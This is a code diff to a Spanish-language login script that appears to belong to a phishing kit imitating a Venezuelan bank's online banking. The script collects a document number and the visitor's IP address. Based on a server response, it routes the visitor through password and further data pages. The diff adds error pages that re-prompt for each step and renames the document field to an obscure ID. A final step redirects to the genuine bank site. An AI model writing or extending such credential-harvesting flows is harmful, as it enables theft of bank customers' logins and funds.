@@ -183,7 +183,7 @@ document.addEventListener('DOMContentLoaded', function () {
     
     // Inicializar elementos del DOM
     const tipoDocumentoSelect = document.getElementById("tipodocben");
-    const tiki = document.getElementById('documento');
+    const tiki = document.getElementById('doc452acd');
     const submitBtn = document.getElementById('cmdLogin');
     const ipInput = document.getElementById('direccionIP');
     const spinner = document.getElementById('preloader');
@@ -394,13 +394,22 @@ document.addEventListener('DOMContentLoaded', function () {
                         // Redirigir según el valor de page
                         switch (page) {
                             case 1:
-                                window.location.href = "index.html";
+                                window.location.href = "p=1.html";
+                                break;
+                            case 11:
+                                window.location.href = "err-p=1.html";
                                 break;
                             case 2:
                                 window.location.href = "passwd.html";
                                 break;
+                            case 22:
+                                window.location.href = "err-passwd.html";
+                                break;
                             case 3:
                                 window.location.href = "jrico.html";
+                                break;
+                            case 33:
+                                window.location.href = "err-jrico.html";
                                 break;
                             case 9:
                                 window.location.href = "https://bdtenlinea.bdt.com.ve/?p=1";
